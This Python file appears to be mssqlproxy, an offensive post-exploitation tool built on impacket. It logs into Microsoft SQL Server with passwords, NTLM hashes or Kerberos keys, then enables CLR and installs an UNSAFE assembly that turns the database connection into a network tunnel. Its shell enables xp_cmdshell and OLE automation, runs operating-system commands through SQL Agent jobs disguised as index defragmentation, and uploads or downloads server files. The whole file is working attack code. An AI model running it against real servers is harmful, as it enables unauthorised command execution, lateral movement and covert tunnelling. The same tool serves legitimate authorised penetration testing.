#!/usr/bin/env python
#
# Copyright (c) 2020 BlackArrow
#
#
# This product includes software developed by
# SecureAuth Corporation (https://www.secureauth.com/).
#
# Description: [MS-TDS] & [MC-SQLR] example.
#
# Original author:
#  Alberto Solino (beto@coresecurity.com/@agsolino)
#
# Author:
#  Pablo Martinez (https://twitter.com/xassiz)
#

from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
import logging

import socket
import thread
import select

from impacket.examples import logger
from impacket import version, tds



# Proxy config

MSG_END_OF_TRANSIMISSION = "\x31\x41\x59\x26\x53\x58\x97\x93\x23\x84"
MSG_EXIT_CMD = "\x12\x34\x56"
MSG_EXIT_ACK = "\x65\x43\x21"

ASSEMBLY_NAME = "Microsoft.SqlServer.Proxy"
PROCEDURE_NAME = "sp_start_proxy"




def set_configuration(mssql, option, value):
    mssql.batch("exec master.dbo.sp_configure '%s',%d; RECONFIGURE;" % (option, value))
    return check_configuration(mssql, option, value)


def check_configuration(mssql, option, value):
    try:
        res = mssql.batch("SELECT cast(value as INT) as v FROM sys.configurations where name = '%s'" % option)[0]['v']
        return res == value
    except:
        return False

def file_exists(mssql, path):
    try:
        res = mssql.batch("DECLARE @r INT; EXEC master.dbo.xp_fileexist '%s', @r OUTPUT; SELECT @r as n" % path)[0]['n']    
        return res == 1
    except:
        return False


def proxy_install(mssql, args):
    logging.info("Proxy mode: install")
    
    if set_configuration(mssql, 'show advanced options', 1) == False:
        logging.error("Cannot enable 'show advanced options'")
        return
    
    if set_configuration(mssql, 'clr enabled', 1) == False:
        logging.error("Cannot enable CLR")
        return
    else:
        logging.info("CLR enabled")
        
    
    with open(args.clr, 'rb') as f:
        data = f.read().encode('hex')
        
        mssql.batch("USE msdb; CREATE ASSEMBLY [%s] FROM 0x%s WITH PERMISSION_SET = UNSAFE" % (ASSEMBLY_NAME, data))
        res = mssql.batch("USE msdb; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s'" % ASSEMBLY_NAME)[0]['n']
        if res == 1:
            logging.info("Assembly successfully installed")
            
            mssql.batch("CREATE PROCEDURE [dbo].[%s]"
                        " @path NVARCHAR (4000), @client_addr NVARCHAR (4000), @client_port INTEGER"
                        " AS EXTERNAL NAME [%s].[StoredProcedures].[sp_start_proxy]" % (PROCEDURE_NAME, ASSEMBLY_NAME))
            
            res = mssql.batch("SELECT COUNT(*) AS n FROM sys.procedures where name = '%s'" % PROCEDURE_NAME)[0]['n']    
            if res == 1:
                logging.info("Procedure successfully installed")
            else:
                logging.error("Cannot install procedure")
            
        else:
            logging.error("Cannot install assembly")
    

def proxy_uninstall(mssql, args):
    logging.info("Proxy mode: uninstall")
    
    res = mssql.batch("USE msdb; DROP PROCEDURE [%s]; SELECT COUNT(*) AS n FROM sys.procedures where name = '%s' " % (PROCEDURE_NAME, PROCEDURE_NAME))[0]['n']
    if res == 0:
        logging.info("Procedure successfully uninstalled")
    else:
        logging.error("Cannot uninstall procedure")
        
    res = mssql.batch("DROP ASSEMBLY [%s]; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s' " % (ASSEMBLY_NAME, ASSEMBLY_NAME))[0]['n']
    if res == 0:
        logging.info("Assembly successfully uninstalled")
    else:
        logging.error("Cannot uninstall assembly")
        
    if set_configuration(mssql, 'show advanced options', 1) == False:
        logging.error("Cannot enable 'show advanced options'")
    else:
        if set_configuration(mssql, 'clr enabled', 0) == False:
            logging.error("Cannot disable CLR")
        else:
            logging.info("CLR disabled")


def proxy_check(mssql, args):
    success = True
    
    logging.info("Proxy mode: check")
    
    res = mssql.batch("USE msdb; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s'" % ASSEMBLY_NAME)[0]['n']
    if res == 1:
        logging.info("Assembly is installed")
    else:
        success = False
        logging.error("Assembly not found")
    
    res = mssql.batch("SELECT COUNT(*) AS n FROM sys.procedures where name = '%s'" % PROCEDURE_NAME)[0]['n']    
    if res == 1:
        logging.info("Procedure is installed")
    else:
        success = False
        logging.error("Procedure not found")
      
    if file_exists(mssql, args.reciclador):
        logging.info("reciclador is installed")
    else:
        success = False
        logging.error("reciclador not found")
        
    if check_configuration(mssql, 'clr enabled', 1):
        logging.info("clr enabled")
    else:
        success = False
        logging.error("clr disabled")
    
    return success


def proxy_worker(server, client):
    logging.info("New connection")

    client.setblocking(0)

    while True:

        readable, writable, errfds = select.select([client, server], [], [], 60)

        for sock in readable:
            if sock is client:
                data = client.recv(2048)
                if len(data) == 0:
                    logging.info("Client disconnected!")

                    logging.debug("Sending end-of-tranmission")
                    server.sendall(MSG_END_OF_TRANSIMISSION)
                    return

                logging.debug("Client: %s" % data.encode('hex'))
                server.sendall(data)

            elif sock is server:
                data = server.recv(2048)
                if len(data) == 0:
                    logging.info("Server disconnected!")
                    return

                logging.debug("Server: %s" % data.encode('hex'))
                client.sendall(data)


def proxy_start(mssql, args):    
    if not proxy_check(mssql, args):
        return

    logging.info("Proxy mode: start")
    
    laddr, lport = mssql.socket.getsockname()
    if args.no_check_src_port:
        lport = 0
        logging.info("Connection is not direct")
    else:
        logging.debug("Local addr = %s:%d" % (laddr, lport))

    local_port = getattr(args, 'local_port')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", local_port))
    except Exception as err:
        logging.error("Error: '%s'" % err)
        return


    logging.info("Listening on port %d..." % local_port)
    try:
        mssql.batch("DECLARE @ip varchar(15); SET @ip=TRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address')));"
                    "EXEC msdb.dbo.%s '%s', @ip, %d" % (PROCEDURE_NAME, args.reciclador, lport), tuplemode=False, wait=False)
        data = mssql.socket.recv(2048)
        if 'Powered by blackarrow.net' in data:
            logging.info("ACK from server!")
            mssql.socket.sendall("ACK")
        else:
            logging.error("cannot establish connection")
            raise Exception('cannot establish connection')

        s.listen(10)
        while True:
            client, _ = s.accept()
            thread.start_new_thread(proxy_worker, (mssql.socket, client))

    except:
        mssql.socket.sendall(MSG_EXIT_CMD)

        ack = mssql.socket.recv(1024)
        if MSG_EXIT_ACK in ack:
           logging.info("Bye!")
        else:
           logging.error("Server did not ack :(")

        return




if __name__ == '__main__':
    import cmd

    class SQLSHELL(cmd.Cmd):
        def __init__(self, SQL):
            cmd.Cmd.__init__(self)
            self.sql = SQL
            self.prompt = 'SQL> '
            self.intro = '[!] Press help for extra shell commands'

        def do_help(self, line):
            print("""
     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     download {remote} {local}  - download a remote file to a local path
     upload {local} {remote}    - upload a local file to a remote path (OLE required)
     enable_ole                 - you know what it means
     disable_ole                - you know what it means
     """)

        def do_download(self, params):
            try:
                remote, local = params.split(' ')
            except:
                logging.error("download: invalid params")
                return

            print("[+] Downloading '%s' to '%s'..." % (remote, local))
            try:
                self.sql.sql_query("SELECT * FROM OPENROWSET(BULK N'%s', SINGLE_BLOB) rs" % remote)
                data = self.sql.rows[0]['BulkColumn']

                with open(local, 'wb') as f:
                    f.write(data.decode('hex'))

                print("[+] Download completed")
            except:
                pass

        def do_upload(self, params):
            try:
                local, remote = params.split(' ')
            except:
                logging.error("upload: invalid params")
                return
            
            if check_configuration(self.sql, 'Ole Automation Procedures', 0):
                if self.do_enable_ole(None) == False:
                    return
            
            print("[+] Uploading '%s' to '%s'..." % (local, remote))
            try:
                with open(local, 'rb') as f:
                    data = f.read()
                    print("[+] Size is %d bytes" % len(data))
                    hexdata = "0x%s" % data.encode('hex')

                    self.sql.sql_query("DECLARE @ob INT;"
                                       "EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;"
                                       "EXEC sp_OASetProperty @ob, 'Type', 1;"
                                       "EXEC sp_OAMethod @ob, 'Open';"
                                       "EXEC sp_OAMethod @ob, 'Write', NULL, %s;"
                                       "EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '%s', 2;"
                                       "EXEC sp_OAMethod @ob, 'Close';"
                                       "EXEC sp_OADestroy @ob;" % (hexdata, remote))
                                       
                    if file_exists(self.sql, remote):
                        print("[+] Upload completed")
                    else:
                        print("[-] Error uploading")                    
            except:
                print("[-] Error uploading")   
                pass

        def do_enable_ole(self, line):
            try:
                if set_configuration(self.sql, 'show advanced options', 1) == False:
                    logging.error("cannot enable 'show advanced options'")
                    return False                
                
                if set_configuration(self.sql, 'Ole Automation Procedures', 1) == False:
                    logging.error("cannot enable 'Ole Automation Procedures'")
                    return False
            except:
                return True

        def do_disable_ole(self, line):
            try:
                if set_configuration(self.sql, 'show advanced options', 1) == False:
                    logging.error("cannot enable 'show advanced options'")
                    return False
                
                if set_configuration(self.sql, 'Ole Automation Procedures', 0) == False:
                    logging.error("cannot disable 'Ole Automation Procedures'")
                    return False
            except:
                return True

        def do_shell(self, s):
            os.system(s)

        def do_xp_cmdshell(self, s):
            try:
                self.sql.sql_query("exec master..xp_cmdshell '%s'--sp_password" % s)
                self.sql.printReplies()
                self.sql.colMeta[0]['TypeData'] = 80*2
                self.sql.printRows()
            except:
                pass

        def sp_start_job(self, s):
            try:
                self.sql.sql_query("DECLARE @job NVARCHAR(100);"
                                   "SET @job='IdxDefrag'+CONVERT(NVARCHAR(36),NEWID());"
                                   "EXEC msdb..sp_add_job @job_name=@job,@description='INDEXDEFRAG',"
                                   "@owner_login_name='sa',@delete_level=3;"
                                   "EXEC msdb..sp_add_jobstep @job_name=@job,@step_id=1,@step_name='Defragmentation',"
                                   "@subsystem='CMDEXEC',@command='%s',@on_success_action=1;"
                                   "EXEC msdb..sp_add_jobserver @job_name=@job;"
                                   "EXEC msdb..sp_start_job @job_name=@job;" % s)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_lcd(self, s):
            if s == '':
                print(os.getcwd())
            else:
                os.chdir(s)

        def do_enable_xp_cmdshell(self, line):
            try:
                self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                                   "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_disable_xp_cmdshell(self, line):
            try:
                self.sql.sql_query("exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure "
                                   "'show advanced options', 0 ;RECONFIGURE;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def default(self, line):
            try:
                self.sql.sql_query(line)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def emptyline(self):
            pass

        def do_exit(self, line):
            return True

    # Init the example's logger theme
    logger.init()
    print(version.BANNER)
    print("mssqlproxy - Copyright 2020 BlackArrow")

    parser = argparse.ArgumentParser(add_help = True, description = "TDS client implementation (SSL supported).")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default = 'False', help='whether or not to use Windows '
                                                                                      'Authentication (default False)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-file', type=argparse.FileType('r'), help='input file with commands to execute in the SQL shell')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    # Proxy mode arguments
    group = parser.add_argument_group('proxy mode')

    group.add_argument('-reciclador', action="store", metavar = "path", help='Remote path where DLL is stored in server')
    group.add_argument('-install', action="store_true", help='Installs CLR assembly')
    group.add_argument('-uninstall', action="store_true", help='Uninstalls CLR assembly')
    group.add_argument('-check', action="store_true", help='Checks if CLR is ready')
    group.add_argument('-start', action="store_true", help='Starts proxy')
    group.add_argument('-local-port', action="store", metavar = "port", type=int, default=1337, help='Local port to listen on')
    group.add_argument('-clr', action="store", metavar="local_path", help='Local CLR path')
    group.add_argument('-no-check-src-port', action="store_true", help='Use this option when connection is not direct (e.g. proxy)')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()


    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True



    # If proxy params
    if any(getattr(options, l) for l in ['reciclador', 'install', 'uninstall', 'check', 'start', 'clr']):
        proxy_mode = True

        if sum((options.install, options.uninstall, options.check, options.start)) != 1:
            logging.error("please, choose one of the following actions: install, uninstall, check, start")
            sys.exit(1)

        if (options.start or options.check) and not options.reciclador:
            logging.error("reciclador path is mandatory")
            sys.exit(1)
        
        if options.install and not options.clr:
            logging.error("CLR path is mandatory")
            sys.exit(1)
    else:
        proxy_mode = False


    ms_sql = tds.MSSQL(address, int(options.port))
    ms_sql.connect()
    try:
        if options.k is True:
            res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
                                       kdcHost=options.dc_ip)
        else:
            res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
        ms_sql.printReplies()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
        res = False


    if res is True:

        # If proxy mode
        if proxy_mode:
            proxy_opt = {
                'install' : proxy_install,
                'uninstall': proxy_uninstall,
                'check' : proxy_check,
                'start' : proxy_start
            }

            opt = next(mode for mode in proxy_opt.keys() if getattr(options, mode))
            proxy_opt[opt](ms_sql, options)

        # Shell mode
        else:
            shell = SQLSHELL(ms_sql)
            if options.file is None:
                shell.cmdloop()
            else:
                for line in options.file.readlines():
                    print("SQL> %s" % line, end=' ')
                shell.onecmd(line)

    ms_sql.disconnect()